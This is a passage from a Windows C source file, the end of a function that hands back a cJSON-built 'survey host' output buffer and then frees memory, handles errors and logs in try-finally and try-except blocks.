			(*lppOutputBuffer) = (LPBYTE)szSurveyHostOutput;
			(*lpdwOutputBufferSize) = dwSurveyHostOutputSize;

		} // end try-finally
		__finally
		{
			if (NULL != lpJsonInput)
			{
				cJSON_Delete(lpJsonInput);
				lpJsonInput = NULL;
			}

			if (NULL != lpJsonSurveyHostOutput)
			{
				cJSON_Delete(lpJsonSurveyHostOutput);
				lpJsonSurveyHostOutput = NULL;
			}

			if (ERROR_SUCCESS != dwErrorCode)
			{
				if (NULL != (*lppOutputBuffer))
				{
					//dwTempErrorCode = FREE(*lppOutputBuffer);
					//if (ERROR_SUCCESS != dwTempErrorCode)
					//{
					//	DBGPRINT(DEBUG_ERROR, TEXT("FREE failed.(%08x)"), dwTempErrorCode);
					//}

					cJSON_free(szSurveyHostOutput);
					*lppOutputBuffer = NULL;
				}
				*lpdwOutputBufferSize = 0;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}